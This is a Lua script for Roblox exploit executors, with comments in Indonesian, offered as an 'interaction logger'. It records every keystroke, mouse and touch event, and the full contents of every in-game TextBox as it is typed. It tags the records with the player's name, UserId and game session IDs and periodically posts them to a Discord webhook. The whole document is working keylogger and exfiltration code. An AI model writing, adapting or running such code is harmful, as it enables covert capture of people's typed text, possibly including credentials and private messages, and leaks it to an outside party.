--[[
    ROBLOX INTERACTION LOGGER v2.0
    ----------------------------------------
    Track interaksi user → kirim ke Discord webhook
    - Mouse click, keyboard, textbox, touch, dll
    - Batch system biar gak kena rate limit
    - Auto-flush tiap X detik
    - Manual flush via command
    
    Author: Lanz
]]

-- ==================================================
-- CONFIG
-- ==================================================
local CONFIG = {
    -- Discord Webhook
    WEBHOOK_URL      = "https://discord.com/api/webhooks/xxx/yyy",  -- ← GANTI
    WEBHOOK_USERNAME = "Roblox Logger",
    WEBHOOK_AVATAR   = "",  -- optional, URL image
    
    -- Batching
    AUTO_FLUSH_INTERVAL = 10,     -- detik, kirim batch tiap X detik
    MAX_BATCH_SIZE      = 20,     -- max entry per batch
    MIN_ENTRIES_TO_FLUSH = 1,     -- minimal entry biar di-flush
    
    -- Local
    PRINT_TO_CONSOLE = true,
    SAVE_TO_FILE     = true,
    FILE_NAME        = "interaction_log.json",
    
    -- Event filter
    LOG_MOUSE_CLICK  = true,
    LOG_MOUSE_MOVE   = false,
    LOG_MOUSE_HOVER  = true,
    LOG_SCROLL       = true,
    LOG_KEYBOARD     = true,
    LOG_TEXTBOX      = true,
    LOG_FOCUS        = true,
    LOG_TOUCH        = true,
    LOG_DRAG         = true,
    LOG_GAMEPAD      = true,
    LOG_GUI_CLICK    = true,
    
    -- Limits
    MAX_LOG_ENTRIES = 10000,
    VERBOSE = false,
}

-- ==================================================
-- SERVICES
-- ==================================================
local Players              = game:GetService("Players")
local UserInputService     = game:GetService("UserInputService")
local RunService           = game:GetService("RunService")
local HttpService          = game:GetService("HttpService")
local CoreGui              = game:GetService("CoreGui")

local LocalPlayer = Players.LocalPlayer

-- ==================================================
-- STATE
-- ==================================================
local Logs = {}
local PendingBatch = {}
local startTime = tick()
local lastHoverInstance = nil
local lastHoverTime = 0
local lastFlushTime = 0
local totalFlushed = 0
local isFlushing = false

-- ==================================================
-- HTTP REQUEST WRAPPER (multi-executor)
-- ==================================================
local function httpPost(url, body, headers)
    local req = request or http_request or (syn and syn.request) or (fluxus and fluxus.request)
    if not req then
        return false, "no http request function"
    end
    
    local ok, res = pcall(function()
        return req({
            Url = url,
            Method = "POST",
            Headers = headers or { ["Content-Type"] = "application/json" },
            Body = body,
        })
    end)
    
    if not ok then
        return false, tostring(res)
    end
    
    return true, res
end

-- ==================================================
-- HELPERS
-- ==================================================
local function getTimestamp()
    return string.format("%.3fs", tick() - startTime)
end

local function getRealTimestamp()
    return os.date("%Y-%m-%d %H:%M:%S")
end

local function getInstancePath(instance)
    if not instance then return "nil" end
    local path = {}
    local current = instance
    local depth = 0
    while current and depth < 10 do
        table.insert(path, 1, current.Name)
        if current == game then
            table.insert(path, 1, "game")
            break
        elseif current == workspace then
            table.insert(path, 1, "workspace")
            break
        elseif current.Parent == nil then
            break
        end
        current = current.Parent
        depth = depth + 1
    end
    return table.concat(path, ".")
end

local function getInstanceInfo(instance)
    if not instance then return nil end
    local info = {
        name      = instance.Name,
        className = instance.ClassName,
        path      = getInstancePath(instance),
    }
    if instance:IsA("Player") then
        info.isPlayer    = true
        info.userId      = instance.UserId
        info.displayName = instance.DisplayName
        info.accountAge  = instance.AccountAge
    end
    if instance:IsA("TextBox") then
        info.text        = instance.Text
        info.isFocused   = instance:IsFocused()
    end
    if instance:IsA("GuiButton") then
        info.isButton = true
        info.text     = instance.Text or nil
    end
    info.inWorkspace = instance:IsDescendantOf(workspace)
    info.inCoreGui   = instance:IsDescendantOf(CoreGui)
    return info
end

-- ==================================================
-- ADD LOG
-- ==================================================
local function addLog(eventType, data)
    local entry = {
        timestamp = getTimestamp(),
        realTime  = getRealTimestamp(),
        event     = eventType,
        data      = data or {},
    }
    
    table.insert(Logs, entry)
    table.insert(PendingBatch, entry)
    
    if #Logs > CONFIG.MAX_LOG_ENTRIES then
        table.remove(Logs, 1)
    end
    
    if CONFIG.PRINT_TO_CONSOLE then
        print(string.format("[%s] %s", entry.timestamp, eventType))
        if CONFIG.VERBOSE and next(data) then
            for k, v in pairs(data) do
                if type(v) ~= "table" then
                    print(string.format("   %s: %s", k, tostring(v)))
                end
            end
        end
    end
    
    -- Auto-flush kalau batch uda penuh
    if #PendingBatch >= CONFIG.MAX_BATCH_SIZE then
        task.spawn(function()
            local FlushModule = getgenv().__Logger
            if FlushModule and FlushModule.Flush then
                FlushModule.Flush()
            end
        end)
    end
    
    return entry
end

-- ==================================================
-- SAVE TO FILE
-- ==================================================
local function saveToFile(silent)
    if not CONFIG.SAVE_TO_FILE then return end
    if not writefile then return end
    
    local payload = {
        meta = {
            savedAt      = getRealTimestamp(),
            totalEntries = #Logs,
            playerName   = LocalPlayer.Name,
            playerUserId = LocalPlayer.UserId,
            gameId       = game.GameId,
            jobId        = game.JobId,
        },
        logs = Logs,
    }
    
    local ok = pcall(writefile, CONFIG.FILE_NAME, HttpService:JSONEncode(payload))
    if ok and not silent then
        print(string.format("[Logger] Saved %d entries", #Logs))
    end
end

-- ==================================================
-- FORMAT BATCH UNTUK DISCORD
-- ==================================================
local function formatBatchForDiscord(batch)
    if #batch == 0 then return nil end
    
    -- Build embed
    local lines = {}
    local maxLines = 25
    local shown = math.min(#batch, maxLines)
    
    for i = 1, shown do
        local e = batch[i]
        local data = e.data or {}
        local detail = ""
        
        -- Build detail string berdasarkan event type
        if e.event == "MouseClick" then
            local pos = data.screenPos or {}
            local target = data.targetGui or data.target3D
            detail = string.format("pos(%d,%d)",
                math.floor(pos.x or 0),
                math.floor(pos.y or 0)
            )
            if target and target.className then
                detail = detail .. " → `" .. target.className .. "`"
            end
        
        elseif e.event == "KeyDown" or e.event == "KeyUp" then
            detail = "`" .. tostring(data.key or "?") .. "`"
        
        elseif e.event == "TextboxInput" then
            detail = "`" .. tostring(data.text or "") .. "`"
        
        elseif e.event == "TextboxFocus" then
            detail = "focused: `" .. (data.textbox and data.textbox.name or "?") .. "`"
        
        elseif e.event == "GuiButtonClick" then
            detail = "clicked: `" .. tostring(data.text or (data.button and data.button.name) or "?") .. "`"
        
        elseif e.event == "TouchStart" then
            local pos = data.position or {}
            detail = string.format("touch(%d,%d)",
                math.floor(pos.x or 0),
                math.floor(pos.y or 0)
            )
        
        elseif e.event == "Drag" then
            detail = string.format("drag %s in %s",
                tostring(data.distance or "?"),
                tostring(data.duration or "?")
            )
        
        elseif e.event == "Scroll" then
            detail = "scroll " .. tostring(data.direction or "?")
        
        elseif e.event == "HoverStart" then
            local t = data.target or {}
            detail = "hover: `" .. tostring(t.className or "?") .. "`"
        
        else
            detail = "`" .. HttpService:JSONEncode(data):sub(1, 60) .. "`"
        end
        
        table.insert(lines, string.format("`[%s]` **%s** %s",
            e.timestamp, e.event, detail
        ))
    end
    
    local description = table.concat(lines, "\n")
    
    -- Kalau ada sisa batch, tambahin info
    if #batch > maxLines then
        description = description .. string.format("\n*... +%d more entries*", #batch - maxLines)
    end
    
    return {
        embeds = {{
            title = "🎯 Interaction Log Batch",
            description = description:sub(1, 4000),  -- Discord limit 4096
            color = 0x7c5cff,
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
            footer = {
                text = string.format("%s (ID: %d) | Total: %d",
                    LocalPlayer.Name, LocalPlayer.UserId, totalFlushed + #batch
                ),
            },
        }},
        username = CONFIG.WEBHOOK_USERNAME,
        avatar_url = CONFIG.WEBHOOK_AVATAR ~= "" and CONFIG.WEBHOOK_AVATAR or nil,
    }
end

-- ==================================================
-- FLUSH BATCH → DISCORD
-- ==================================================
local function flushBatch(force)
    if isFlushing then return end
    if not force and #PendingBatch < CONFIG.MIN_ENTRIES_TO_FLUSH then return end
    if #PendingBatch == 0 then return end
    if not CONFIG.WEBHOOK_URL or CONFIG.WEBHOOK_URL:find("xxx") then
        warn("[Logger] Webhook URL belum di-set")
        return
    end
    
    isFlushing = true
    
    -- Ambil batch, clear pending
    local batch = PendingBatch
    PendingBatch = {}
    
    local payload = formatBatchForDiscord(batch)
    if not payload then
        isFlushing = false
        return
    end
    
    local jsonBody = HttpService:JSONEncode(payload)
    
    local ok, res = httpPost(CONFIG.WEBHOOK_URL, jsonBody, {
        ["Content-Type"] = "application/json",
    })
    
    if ok then
        totalFlushed = totalFlushed + #batch
        if CONFIG.PRINT_TO_CONSOLE then
            print(string.format("[Logger] ✓ Flushed %d entries to Discord", #batch))
        end
    else
        -- Gagal → balikin ke pending biar retry
        for _, e in ipairs(batch) do
            table.insert(PendingBatch, e)
        end
        warn("[Logger] ✗ Flush failed: " .. tostring(res))
    end
    
    lastFlushTime = tick()
    isFlushing = false
end

-- ==================================================
-- AUTO-FLUSH LOOP
-- ==================================================
task.spawn(function()
    while task.wait(1) do
        local elapsed = tick() - lastFlushTime
        if elapsed >= CONFIG.AUTO_FLUSH_INTERVAL then
            if #PendingBatch > 0 then
                flushBatch(false)
            end
        end
    end
end)

-- ==================================================
-- AUTO-SAVE FILE LOOP
-- ==================================================
if CONFIG.SAVE_TO_FILE then
    task.spawn(function()
        while task.wait(30) do
            saveToFile(true)
        end
    end)
end

-- ==================================================
-- EVENT LISTENERS
-- ==================================================

-- Mouse Click
if CONFIG.LOG_MOUSE_CLICK then
    UserInputService.InputBegan:Connect(function(input, gameProcessed)
        if input.UserInputType == Enum.UserInputType.MouseButton1
        or input.UserInputType == Enum.UserInputType.MouseButton2
        or input.UserInputType == Enum.UserInputType.MouseButton3 then
            
            local target, guiTarget
            local mouse = LocalPlayer:GetMouse()
            if mouse then target = mouse.Target end
            
            local pg = LocalPlayer:FindFirstChild("PlayerGui")
            if pg then
                local gui = pg:GetGuiObjectsAtPosition(input.Position.X, input.Position.Y)
                if gui and #gui > 0 then guiTarget = gui[1] end
            end
            
            addLog("MouseClick", {
                inputType     = tostring(input.UserInputType),
                screenPos     = { x = input.Position.X, y = input.Position.Y },
                gameProcessed = gameProcessed,
                target3D      = getInstanceInfo(target),
                targetGui     = getInstanceInfo(guiTarget),
            })
        end
    end)
end

-- Mouse Move (optional)
if CONFIG.LOG_MOUSE_MOVE then
    UserInputService.InputChanged:Connect(function(input, _)
        if input.UserInputType == Enum.UserInputType.MouseMovement then
            addLog("MouseMove", {
                screenPos = { x = input.Position.X, y = input.Position.Y },
            })
        end
    end)
end

-- Hover
if CONFIG.LOG_MOUSE_HOVER then
    local mouse = LocalPlayer:GetMouse()
    task.spawn(function()
        while task.wait(0.2) do
            if mouse.Target ~= lastHoverInstance then
                if lastHoverInstance then
                    local dur = tick() - lastHoverTime
                    if dur > 0.3 then
                        addLog("HoverEnd", {
                            target   = getInstanceInfo(lastHoverInstance),
                            duration = string.format("%.2fs", dur),
                        })
                    end
                end
                lastHoverInstance = mouse.Target
                lastHoverTime = tick()
                if lastHoverInstance then
                    addLog("HoverStart", {
                        target = getInstanceInfo(lastHoverInstance),
                    })
                end
            end
        end
    end)
end

-- Scroll
if CONFIG.LOG_SCROLL then
    UserInputService.InputChanged:Connect(function(input, _)
        if input.UserInputType == Enum.UserInputType.MouseWheel then
            addLog("Scroll", {
                direction = input.Position.Z > 0 and "up" or "down",
                delta     = input.Position.Z,
            })
        end
    end)
end

-- Keyboard
if CONFIG.LOG_KEYBOARD then
    UserInputService.InputBegan:Connect(function(input, gameProcessed)
        if input.UserInputType == Enum.UserInputType.Keyboard then
            addLog("KeyDown", {
                key           = tostring(input.KeyCode),
                keyCode       = input.KeyCode.Value,
                gameProcessed = gameProcessed,
            })
        end
    end)
    UserInputService.InputEnded:Connect(function(input, _)
        if input.UserInputType == Enum.UserInputType.Keyboard then
            addLog("KeyUp", {
                key     = tostring(input.KeyCode),
                keyCode = input.KeyCode.Value,
            })
        end
    end)
end

-- TextBox
if CONFIG.LOG_TEXTBOX then
    local function hookTextBox(tb)
        if not tb:IsA("TextBox") then return end
        tb.Focused:Connect(function()
            addLog("TextboxFocus", { textbox = getInstanceInfo(tb) })
        end)
        tb.FocusLost:Connect(function(enter, reason)
            addLog("TextboxFocusLost", {
                textbox      = getInstanceInfo(tb),
                finalText    = tb.Text,
                enterPressed = enter,
                reason       = reason and tostring(reason) or nil,
            })
        end)
        tb:GetPropertyChangedSignal("Text"):Connect(function()
            addLog("TextboxInput", {
                textbox = getInstanceInfo(tb),
                text    = tb.Text,
                length  = #tb.Text,
            })
        end)
    end
    
    for _, d in ipairs(game:GetDescendants()) do
        if d:IsA("TextBox") then hookTextBox(d) end
    end
    game.DescendantAdded:Connect(function(d)
        if d:IsA("TextBox") then
            task.wait(0.1)
            hookTextBox(d)
        end
    end)
end

-- Focus
if CONFIG.LOG_FOCUS then
    UserInputService.TextBoxFocused:Connect(function(tb)
        addLog("FocusChanged", { focused = getInstanceInfo(tb) })
    end)
    UserInputService.TextBoxFocusReleased:Connect(function(tb, enter)
        addLog("FocusReleased", {
            textbox      = getInstanceInfo(tb),
            enterPressed = enter,
        })
    end)
end

-- GUI Button
if CONFIG.LOG_GUI_CLICK then
    local function hookBtn(btn)
        if not btn:IsA("GuiButton") then return end
        btn.MouseButton1Click:Connect(function()
            addLog("GuiButtonClick", {
                button = getInstanceInfo(btn),
                text   = btn.Text or nil,
            })
        end)
    end
    for _, d in ipairs(game:GetDescendants()) do
        if d:IsA("GuiButton") then hookBtn(d) end
    end
    game.DescendantAdded:Connect(function(d)
        if d:IsA("GuiButton") then
            task.wait(0.1)
            hookBtn(d)
        end
    end)
end

-- Touch
if CONFIG.LOG_TOUCH then
    UserInputService.TouchStarted:Connect(function(input, gp)
        addLog("TouchStart", {
            position      = { x = input.Position.X, y = input.Position.Y },
            gameProcessed = gp,
        })
    end)
    UserInputService.TouchEnded:Connect(function(input, _)
        addLog("TouchEnd", {
            position = { x = input.Position.X, y = input.Position.Y },
        })
    end)
    UserInputService.TouchTap:Connect(function(positions, gp)
        addLog("TouchTap", {
            touchCount = #positions,
            gameProcessed = gp,
        })
    end)
end

-- Drag
if CONFIG.LOG_DRAG then
    local dragStart = nil
    UserInputService.InputBegan:Connect(function(input, _)
        if input.UserInputType == Enum.UserInputType.MouseButton1
        or input.UserInputType == Enum.UserInputType.Touch then
            dragStart = { position = input.Position, time = tick() }
        end
    end)
    UserInputService.InputEnded:Connect(function(input, _)
        if dragStart and (input.UserInputType == Enum.UserInputType.MouseButton1
        or input.UserInputType == Enum.UserInputType.Touch) then
            local dx = input.Position.X - dragStart.position.X
            local dy = input.Position.Y - dragStart.position.Y
            local dist = math.sqrt(dx*dx + dy*dy)
            local dur = tick() - dragStart.time
            if dist > 10 then
                addLog("Drag", {
                    startPos = { x = dragStart.position.X, y = dragStart.position.Y },
                    endPos   = { x = input.Position.X, y = input.Position.Y },
                    distance = string.format("%.1f px", dist),
                    duration = string.format("%.2fs", dur),
                })
            end
            dragStart = nil
        end
    end)
end

-- Gamepad
if CONFIG.LOG_GAMEPAD then
    UserInputService.InputBegan:Connect(function(input, gp)
        if input.UserInputType == Enum.UserInputType.Gamepad1
        or input.UserInputType == Enum.UserInputType.Gamepad2 then
            addLog("GamepadButton", {
                key           = tostring(input.KeyCode),
                gameProcessed = gp,
            })
        end
    end)
end

-- ==================================================
-- PUBLIC API
-- ==================================================
getgenv().__Logger = {
    Flush         = function() flushBatch(true) end,
    Clear         = function() Logs = {}; PendingBatch = {} end,
    Save          = function() saveToFile(false) end,
    GetLogs       = function() return Logs end,
    GetPending    = function() return PendingBatch end,
    GetStats      = function()
        return {
            totalLogged   = #Logs,
            pendingBatch  = #PendingBatch,
            totalFlushed  = totalFlushed,
            uptime        = string.format("%.0fs", tick() - startTime),
        }
    end,
    SendTest      = function()
        addLog("TestEvent", { message = "Manual test from console" })
        flushBatch(true)
    end,
    SetWebhook    = function(url)
        CONFIG.WEBHOOK_URL = url
        print("[Logger] Webhook updated")
    end,
}

print("========================================")
print("  ROBLOX INTERACTION LOGGER v2.0")
print("========================================")
print("Player: " .. LocalPlayer.Name .. " (" .. LocalPlayer.UserId .. ")")
print("Webhook: " .. (CONFIG.WEBHOOK_URL:find("xxx") and "⚠️ NOT SET" or "✓ SET"))
print("Auto-flush: every " .. CONFIG.AUTO_FLUSH_INTERVAL .. "s")
print("")
print("Commands:")
print("  __Logger.Flush()      - flush batch now")
print("  __Logger.SendTest()   - kirim test log")
print("  __Logger.GetStats()   - liat statistik")
print("  __Logger.Save()       - save ke file")
print("  __Logger.Clear()      - clear logs")
print("  __Logger.SetWebhook() - ganti webhook")
print("========================================")
